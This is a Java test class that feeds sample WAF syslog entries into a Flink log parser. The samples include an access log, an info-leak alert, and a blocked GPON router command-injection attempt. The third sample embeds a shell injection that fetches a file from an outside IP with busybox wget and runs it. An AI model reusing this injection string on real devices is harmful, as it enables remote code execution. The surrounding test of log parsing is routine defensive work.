package com.crc.log.flink.test.log;

import com.crc.log.flink.common.utils.JsonUtils;
import com.crc.log.flink.config.AllConfig;
import com.crc.log.flink.es.DataProcessFuncation;

import java.util.concurrent.ConcurrentHashMap;

/**
 * @author jixiangqi
 * @date 2022/4/28
 */
public class ResolvLvMengWafLogTest {

    public static void main(String[] args) {
        AllConfig config = new AllConfig();
        DataProcessFuncation.CONIFG = config;
        config.setMode("single");
        config.setParse("ResolvLvMengWafLog");
        config.setIndex("sec_all");


        String str = "<11>Apr 28 13:50:22 localhost waf: tag:waf_log_webaccess site_id:1624608504  protect_id:2624608691  stat_time:2022-04-28 13:50:22  alertlevel:LOW  event_type:WEB Access Logs  dst_ip:10.108.29.120  dst_port:9088  url:/SupplierRecOut/materialDetailController.do?datagridGather&field=id%2csupplierName%2csupplierCode%2cfactoryCode%2cpoNo%2cmaterialVoucher%2cmaterialCode%2cmaterialName%2creceiptDate%2creceiptDate%5fbegin%2creceiptDate%5fend%2creceiptCount%2cpaymentUnitPrice%2ctaxRate%2ccurrency%2csettlementMoney%2csapPaymentTerm%2cauditName%2cmaterialState%2csummaryNo%2cmatchingChildNo%2c  src_ip:112.81.16.34  src_port:49647  method:POST  agent:Mozilla/5.0%20(Windows%20NT%2010.0;%20Win64;%20x64)%20AppleWebKit/537.36%20(KHTML%2c%20like%20Gecko)%20Chrome/100.0.4896.127%20Safari/537.36%20Edg/100.0.1185.50  count_num:1  wa_host:e.szcsot.com  http_protocol:HTTP/1.1  protocol_type:HTTPS  wci:None  wsi:None  country:China  action:Other  req_content_type:application/x-www-form-urlencoded; charset=UTF-8  req_content_len:234  res_content_type:text/html;charset=UTF-8  res_content_len:869  waf_status_code:0  ser_status_code:200  correlation_id:7091527962537444846  raw_client_ip:112.81.16.34";
        ConcurrentHashMap<String, Object> proc = DataProcessFuncation.parse(str,"index");
        JsonUtils.printStr(proc);

        str = "<11>Apr 28 13:46:51 localhost waf: tag:waf_log_websec site_id:1624611724  protect_id:2624611761  dst_ip:10.108.29.140  dst_port:8989  src_ip:59.39.129.110  src_port:47553  method:POST  domain:logwire.szcsot.com  uri:/api/entry/drivers/m%2daction/or%5floadConfirm  alertlevel:HIGH  event_type:Info_Leak  stat_time:2022-04-28 13:46:50  policy_id:3407874  rule_id:0  action:Forward  block:No  block_info:None  http:HTTP/1.1 500 \n" +
                "X-Content-Type-Options: nosniff\n" +
                "X-XSS-Protection: 1; mode=block\n" +
                "Cache-Control: no-cache, must-revalidate\n" +
                "Pragma: no-cache\n" +
                "Expires: 0\n" +
                "Content-Security-Policy: frame-ancestors 'self' http://otm.szcsot.com:7778 http://otm.szcsot.com http://otm.csot.tcl.com:7778 http://otm.csot.tcl.com http://116.6.22.89:7778 \n" +
                "X-Frame-Options: DENY\n" +
                "Content-Type: application/json;charset=UTF-8\n" +
                "Content-Length: 486\n" +
                "Date: Thu, 28 Apr 2022 05:49:07 GMT\n" +
                "Connection: close\n" +
                "{\"code\":null,\"message\":\"S22042600302: [已装车]状态,已装车确认,请勿重复操作\",\"messageCode\":null,\"messageArgs\":null,\"messageType\":\"error\",\"exception\":\"logwire.core.exceptions.ApplicationException: S22042600302: [已装车]状态,已装车确认,请勿重复操作\",\"traceId\":\"98998a60-dd65-49cb-bcc3-b00ec90408ea\",\"stackTrace\":null,\"data\":null,\"qa\":null,\"question\":null,\"renewedToken\":null,\"duration\":false,\"messageDurative\":false,\"deferMillis\":0,\"objectDescription\":null}  alertinfo:None  proxy_info:None  characters:None  count_num:1  protocol_type:HTTP  wci:None  wsi:None  country:China  correlation_id:7091527056299343525  site_name:Logwire物流管理系统  vsite_name:None  raw_client_ip:59.39.129.110";
        proc = DataProcessFuncation.parse(str,"index");
        JsonUtils.printStr(proc);

        str = "<11>Apr 28 12:31:28 localhost waf: tag:waf_log_websec site_id:1624609636  protect_id:2624609902  dst_ip:10.108.29.103  dst_port:443  src_ip:172.245.10.242  src_port:36170  method:POST  domain:192.168.0.1  uri:/GponForm/diag%5fForm?style/  alertlevel:HIGH  event_type:OS_CMD_Injection  stat_time:2022-04-28 12:31:27  policy_id:2359297  rule_id:25612395  action:Block  block:No  block_info:None  http:POST /GponForm/diag_Form?style/ HTTP/1.1\n" +
                "Host: 192.168.0.1:443\n" +
                "User-Agent: curl/7.3.2\n" +
                "Accept: */*\n" +
                "xAccept-Encoding: gzip, deflate\n" +
                "Connection: keep-alive\n" +
                "Content-Type: text/plain\n" +
                "Content-Length: 134\n" +
                "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=$(busybox+wget+http://23.95.186.164/cache+-O+->+/dev/.p;sh+/dev/.p)&ipv=0  alertinfo:None  proxy_info:None  characters:33,77,1,20,12,dest_host=$(busybox wget http://23.95.186.164/cache -O -> /dev/.p;sh /dev/.p)|||||  count_num:1  protocol_type:HTTPS  wci:None  wsi:None  country:United States  correlation_id:7091507630162237300  site_name:供应商品质管理系统  vsite_name:None  raw_client_ip:172.245.10.242";
        proc = DataProcessFuncation.parse(str,"index");
        JsonUtils.printStr(proc);
    }

}

